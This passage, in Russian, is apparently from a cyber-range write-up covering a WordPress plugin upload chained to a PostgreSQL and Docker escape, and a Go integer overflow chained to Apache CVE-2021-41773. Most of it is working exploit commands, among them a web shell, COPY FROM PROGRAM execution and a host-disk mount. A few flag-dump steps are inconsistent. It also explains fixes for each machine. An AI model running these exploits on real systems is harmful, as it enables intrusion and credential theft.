TS=$(date +%s)
TOKEN=$(echo -n "unique_salt${TS}" | md5sum | cut -d' ' -f1)

curl -v -X POST \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=${TS}" \
  -F "eeSFL_Token=${TOKEN}" \
  -F "file=@shell.png;type=image/png" \
  http://wp.edu.stf/wp-content/plugins/simple-file-list/ee-upload-engine.php
```

Файл попадает в `/wp-content/uploads/simple-file-list/shell.png`. Переименование через файловый движок:

```bash
curl -X POST \
  --data-urlencode "eeSFL_ID=1" \
  --data-urlencode "eeFileOld=shell.png" \
  --data-urlencode "eeListFolder=/" \
  --data-urlencode "eeFileAction=Rename|shell.php" \
  http://wp.edu.stf/wp-content/plugins/simple-file-list/ee-file-engine.php
```

`eeFileAction=Rename|shell.php` — пара операция/аргумент. Плагин разбивает по `|`, использует первую часть как действие, вторую как аргумент. Поскольку в обработчике переименования нет проверки расширения, `.png` становится `.php`.

Доступ к шеллу:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/shell.php?cmd=id"
```

Оттуда читаем `wp-config.php` для получения учётных данных БД:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/shell.php?cmd=cat+%2Fvar%2Fwww%2Fhtml%2Fwp-config.php+%7C+grep+-E+'DB_HOST%7CDB_USER%7CDB_PASSWORD%7CDB_NAME'"
```

Даёт `postgres:postgres@db:5432/postgres`.

Контейнер WordPress находится в Docker-сети (по `hostname` и `ip a` — в `172.19.0.0/16`). Сканируем соседей:

```bash
for i in 1 2 4 5 6 7; do timeout 1 bash -c "echo >/dev/tcp/172.19.0.$i/5432" 2>/dev/null && echo "172.19.0.$i:5432 - OPEN"; done
```

`172.19.0.2:5432` открыт. База данных — отдельный контейнер.

PostgreSQL 9.3-11 имеет CVE-2019-9193 — `COPY ... FROM PROGRAM` выполняет shell-команды от имени суперпользователя базы данных. Пользователь `postgres` в этом контейнере — суперпользователь. Можно злоупотребить PHP-шеллом WordPress, чтобы выполнять произвольный SQL через `pg_connect`:

```php
<?php
$cmd = $_GET['cmd'] ?? 'id';
$db = pg_connect("host=172.19.0.2 port=5432 dbname=postgres user=postgres password=postgres");
$result = pg_query($db, "DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec(cmd_output text);
    COPY cmd_exec FROM PROGRAM '" . pg_escape_string($cmd) . "';
    SELECT * FROM cmd_exec;");
while ($row = pg_fetch_row($result)) { echo $row[0] . "\n"; }
```

Кладём как `pgexec.php` в директорию загрузок WordPress:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=id"
```

Выполняет `id` в контейнере PostgreSQL. Оттуда проверяем SUID у `/bin/bash`:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=ls+-la+/bin/bash"
```

`-rwsr-sr-x` — bash с SUID. RCE как root:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+id"
```

`euid=0(root)`.

Теперь побег из Docker. Читаем `/proc/1/status` для capabilities:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+'cat+/proc/1/status+|+grep+-i+cap'"
```

`CapInh: 0000003fffffffff` — это привилегированный контейнер. Все capabilities, включая `CAP_SYS_ADMIN`, включены.

Проверка монтирований:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+'cat+/proc/1/mountinfo+|+head+-5'"
```

Файловая система overlay смонтирована из `/dev/mapper/ubuntu--vg-ubuntu--lv` — LVM-тома хоста. Поскольку установлен `CAP_SYS_ADMIN`, можно смонтировать файловую систему хоста внутри контейнера:

```bash
unshare -Urm bash -c 'mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt/hostroot && ls -la /mnt/hostroot/home/ && /mnt/hostroot/home/rceflag'
```

`unshare -Urm` создаёт новое пользовательское пространство имён (с `-U`), маппит root (с `-r`) и монтирует (с `-m`). Это необходимо, потому что хотя `CAP_SYS_ADMIN` присутствует в контейнере, ядро всё равно требует, чтобы `mount()` происходил в mount namespace, созданном после user namespace.

Альтернатива, если `unshare` недоступен — использовать `debugfs` для чтения сырого блочного устройства:

```bash
debugfs -R "ls /home/" /dev/dm-0 2>/dev/null
debugfs -R "cat /home/rceflag" /dev/dm-0 2>/dev/null
```

`debugfs` читает структуры ext4 напрямую с блочного устройства, полностью обходя монтирование. Блочное устройство `/dev/dm-0` — это LVM-том, отображённый в контейнер как `/dev/mapper/ubuntu--vg-ubuntu--lv`. Поскольку у нас euid 0 в контейнере, у нас есть `DAC_OVERRIDE` и мы можем читать сырое устройство.

Дамп флага:

```bash
debugfs -R "dump /root/flags/rce/rce.flag /tmp/rce.flag" /dev/dm-0
mkdir -p /root/flags/rce/
cp /tmp/rce.flag /root/flags/rce/rce.flag
/tmp/rceflag
```

**Почему это сработало:** Четыре наложенных проблемы.

1. Плагин WordPress с публично известной неаутентифицированной загрузкой → RCE
2. Учётные данные к соседнему контейнеру PostgreSQL
3. `COPY FROM PROGRAM` PostgreSQL, позволяющий выполнение команд как суперпользователь
4. Привилегированный контейнер с `CAP_SYS_ADMIN`, у которого видно блочное устройство хоста

Каждая проблема по отдельности — серьёзная. Вместе они позволяют неаутентифицированному атакующему пройти от `www-data` в контейнере WordPress до root на хосте.

**Исправление:** обновлять плагины WordPress, не запускать PostgreSQL как суперпользователь в контейнерах, не запускать контейнеры привилегированными без крайней необходимости, использовать user namespaces с `--userns-remap`, чтобы root контейнера не был равен root хоста.

---

## WEB 10 (calculator.edu.stf) — Бизнес-логика, целочисленное переполнение и Apache 2.4.49

На этой машине два сервиса: Go-приложение на 8080 (симулятор энергосистемы) и Apache 2.4.49 на 80 (один из двух CVE 2021 года).

### Apache 2.4.49 — CVE-2021-41773 / CVE-2021-42013

Проверка версии:

```bash
curl -I http://10.124.1.232/
```

`Server: Apache/2.4.49 (Ubuntu)`. Именно эта версия затронута CVE-2021-41773 (path traversal и RCE) и CVE-2021-42013 (его неполное исправление).

Path traversal работает с кодировкой `%2e%2e`:

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

Если включён `mod_cgi`, можно выполнять произвольные команды:

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

На этой машине `mod_cgi` отключён по умолчанию. Path traversal работает для чтения файлов, но RCE требует включения `mod_cgi`. И здесь в игру вступает Go-приложение — оно позволяет включить `mod_cgi`.

### Go-приложение на 8080

Форма на `http://10.124.1.232:8080/` принимает единственное поле `temp` (мегаватты) и возвращает расчёт «потерь при передаче». Фаззинг:

```bash
# Пусто
curl -s -X POST "http://10.124.1.232:8080/" -d ""

# Нормально
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=50"

# Ноль
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=0"

# Отрицательное
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=-100"

# За пределами HTML max="100"
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=999999999999"

# Тесты инъекций
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=' OR 1=1--"
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=\`id\`"
```

HTML говорит `min="0" max="100"`, но бэкенд принимает что угодно. `temp=999999999999` даёт:

```
Considering transmission line losses, 1,000,099,999,998,999,900 Watts requested. The simulator showed the impossibility of allocating
```

Обратное вычисление формулы из нескольких точек данных:

| temp | Сообщённые ватты |
|------|------------------|
| 1 | 1,000,100 |
| 10 | 10,001,000 |
| 100 | 100,010,000 |
| 999,999,999,999 | 1,000,099,999,998,999,900 |

Формула `result = temp * 1,000,100` = `temp * (1,000,000 + 100)` = `temp * 10^6 + temp * 100`. Приложение добавляет фиксированные 100.01% «потерь» к запрошенному значению.

Теперь заходим на территорию переполнения. `int64` максимум — `9,223,372,036,854,775,807`. Пробуем значения, выталкивающие `temp * 1,000,100` за него:

```bash
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=10000000000000"
```

Возвращает:

```
Considering transmission line losses, -8,445,744,073,709,551,616 Watts requested Unexpected simulator behavior! Check the firmware file at [this link]
```

Число завернулось в отрицательное — классическое целочисленное переполнение со знаком. И, что критично, ответ содержит новую форму:

```html
<form enctype="multipart/form-data" method="POST" action="/DNx4Vbb3bQbXstaUf9YkppEV">
    <label for="firmware">Firmware update</label>
    <input name="firmware" type="file" id="firmware"/>
    <input type="submit" value="Submit"/>
</form>
```

Это скрытый эндпоинт обновления прошивки. URL действия `/DNx4Vbb3bQbXstaUf9YkppEV` — случайный путь, недоступный без первоначального срабатывания условия переполнения — это шлюз задачи.

Скачиваем текущую прошивку:

```bash
curl -s "http://10.124.1.232:8080/firmware" -o firmware_original.bin
file firmware_original.bin
```

`ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=...`. Строки:

```bash
strings firmware_original.bin | grep -E "\./firmware|sim\.sh|update\.zip|os/exec"
```

Релевантные строки:

```
./firmware/sim.sh
./firmware/update.zip
os/exec
/home/user/standoff_go/simulator.go
```

Go-бинарник ожидает получить `update.zip` и выполняет `./firmware/sim.sh` из него, используя `os/exec`. Это означает, что мы можем загрузить ZIP с нашим собственным `sim.sh` и получить выполнение кода от имени пользователя Go-приложения.

Собираем ZIP:

```bash
cat > /tmp/sim.sh << 'EOF'
#!/bin/bash
/bin/ln -sf /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
/usr/sbin/apache2ctl -k graceful
EOF
chmod +x /tmp/sim.sh
cd /tmp && zip -0 update.zip sim.sh
```

`zip -0` сохраняет файл без сжатия — некоторые Go-библиотеки ZIP отвергают сжатые данные.

Загружаем:

```bash
curl -s -X POST "http://10.124.1.232:8080/DNx4Vbb3bQbXstaUf9YkppEV" \
  -F "firmware=@/tmp/update.zip;type=application/zip"
```

Ответ приходит как обычный ответ симулятора, но скрипт выполнен. `mod_cgi` теперь включён в Apache.

Теперь Apache RCE:

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; /home/rceflag"
```

`/home/rceflag` запускается, возвращает флаг.

Для LPE эта машина имеет тот же паттерн, что и WEB 9 — проверьте `/home/rceflag` на SUID или capabilities. `find / -perm -4000 -type f` обычно что-то находит. На этой машине задача требует только чтения rceflag как пользователь приложения, поэтому LPE не нужен.

**Почему это сработало:** Три проблемы.

1. Path traversal Apache 2.4.49 — хорошо известен, но `mod_cgi` был отключён, поэтому RCE не работал напрямую.
2. Go-приложение доверяло клиентскому вводу для числового вычисления и не имело проверки диапазона, позволяя целочисленное переполнение.
3. Состояние переполнения раскрывало debug-эндпоинт, принимающий произвольные ZIP-файлы, а обработчик обновления прошивки распаковывал и выполнял `sim.sh` из ZIP без проверки подписи.

Связка между (1) и (3) — включение `mod_cgi` — вот почему это двухшаговая цепочка. Любой из багов в одиночку даёт чтение файла (`/etc/passwd`) или debug-эндпоинт. Вместе они дают RCE.

**Исправление:** подписывать обновления прошивки и проверять подпись перед распаковкой. Проверять содержимое `sim.sh` по белому списку. Не распаковывать исполняемые файлы из предоставленных клиентом архивов. Обновить Apache.

---

## Сводка техник

| Машина | Основная уязвимость | Цепочка |
|--------|---------------------|---------|
| 1 | Обход загрузки файла + CVE-2023-4911 | Загрузить PHP как `.png` → LPE через Looney Tunables |
| 2 | LFI + отравление логов | Имя пользователя FTP → `vsftpd.log` → включение LFI |
| 3 | SSRF + Gopher + PHP-FPM | SSRF к Gopher → FastCGI на 9000 → RCE |
| 4 | Раскрытый SQL-дамп + загрузка | Прочитать `hellophones.sql` → логин админа → загрузка `.php` |
| 5 | JWT с ключом в payload | Подделать админ-токен → скрытая админ-страница → SQL-инъекция |
| 6 | Захардкоженный ключ JWT + загрузка | Прочитать `authenticate.php` → подделать JWT → загрузка `.phtml` |
| 7 | XXE + инъекция команд | OOB XXE → `evil.dtd` → прочитать исходник → инъекция в `$HTTP_USER_AGENT` |
| 8 | Десериализация PHAR | Загрузка PHAR по URL → триггер `phar://` → гаджет `__destruct` |
| 9 | Плагин WP + PostgreSQL + Docker | CVE-2020-36847 → `COPY FROM PROGRAM` → побег через `CAP_SYS_ADMIN` |
| 10 | Целочисленное переполнение + Apache 2.4.49 | Переполнение → загрузка прошивки → включение `mod_cgi` → CVE-2021-41773 |

## Выводы по защите

Повторяющиеся темы:

- **Пиннинг версий имеет значение.** Старый Apache (2.4.49), старый `glibc` (2.36), старый WordPress (5.8.3), старый плагин (4.1.3). Для каждого из них есть публичный эксплойт в течение часов после раскрытия.
- **Автоматические инструменты выигрывают на среднем уровне.** Три из десяти машин пали от автоматических эксплойтов (`looney-tunables`, `Gopherus`, `sqlmap`) без какой-либо ручной цепочки.
- **Захардкоженные секреты повсюду.** Ключи подписи JWT в `authenticate.php`, ключи внутри payload JWT, константы `unique_salt` в исходниках плагинов. Каждый — одна строка, превращающая незначительное чтение файла в RCE.
- **Десериализация хитрее, чем кажется.** Метаданные PHAR десериализуются при любой файловой операции с обёрткой `phar://` — не нужно, чтобы `unserialize()` вызывался явно. Аудит на `unserialize` это полностью упускает.
- **Изоляция контейнеров — не граница безопасности.** Привилегированный контейнер с `CAP_SYS_ADMIN` и видимым LVM-блочным устройством хоста эквивалентен root-шеллу на голом железе. `userns-remap`, отброшенные capabilities и read-only bind mounts — не опции.
- **Бизнес-логические баги часто оказываются переполнениями в маскировке.** Ввод «просто число» в калькуляторе стал ключом к RCE-цепочке, потому что разработчик полагался на HTML `max="100"` для ограничения. Браузеры не являются средствами защиты; сервер должен валидировать.

Каждая машина — отдельная уязвимость, но каждая цепочка в этом диапазоне объединяет две или три. Урок в объединении — баг, который вы находите первым, обычно не тот, что завершает машину.



2026/07/27
